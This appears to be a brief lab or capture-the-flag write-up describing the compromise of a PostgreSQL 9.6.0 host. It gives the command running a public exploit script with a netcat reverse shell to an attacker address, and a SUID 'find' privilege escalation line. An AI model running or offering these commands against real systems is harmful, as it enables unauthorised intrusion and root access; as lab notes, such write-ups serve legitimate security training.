
- PostgreSQL DB 9.6.0  was vulnerable to https://www.exploit-db.com/exploits/50847 which was expoited as below.
```bash
python 50847.py -i 192.168.175.47 -p 5437 -c '/bin/nc -e /bin/sh 192.168.45.156 80'
```

- Ran linpeas and got the PE.

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```
